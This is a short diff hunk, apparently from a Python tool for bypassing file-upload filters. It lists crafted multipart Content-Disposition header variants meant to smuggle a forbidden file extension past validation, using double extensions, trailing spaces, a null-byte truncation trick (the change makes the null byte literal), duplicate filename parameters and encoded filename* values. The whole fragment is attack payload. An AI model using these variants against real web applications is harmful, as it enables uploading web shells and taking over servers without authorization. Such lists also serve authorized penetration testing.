@@ -103,7 +103,7 @@ b'''Content-Disposition: form-data;  name="''' + name + b'''"; filename="''' + f
 b'''Content-Disposition: form-data; name="''' + name + b'''"; filename="''' + filename + b'''.''' + suffix + b''' .jpg"''',
 b'''Content-Disposition: form-data; name="''' + name + b'''"; filename="''' + filename + b'''.''' + suffix + b'''_.jpg"''',
 b'''Content-Disposition: form-data; name="''' + name + b'''"; filename="''' + filename + b'''..''' + suffix + b'''.jpg.''' + suffix + b'''"''',
-b'''Content-Disposition: form-data; name="''' + name + b'''"; filename="''' + filename + b'''.jpg\\x00.''' + suffix + b'''"''',
+b'''Content-Disposition: form-data; name="''' + name + b'''"; filename="''' + filename + b'''.jpg\x00.''' + suffix + b'''"''',
 b'''Content-Disposition: form-data; name="''' + name + b'''"; filename=;filename="''' + filename + b'''.''' + suffix + b'''"''',
 b'''Content-Disposition: form-data+; name="''' + name + b'''"; filename="''' + filename + b'''.''' + suffix + b'''"''',
 b'''Content-Disposition: form-data; name="''' + name + b'''"; filename*="UTF8\'''' + filename + b'''.''' + suffix + b'''"''',
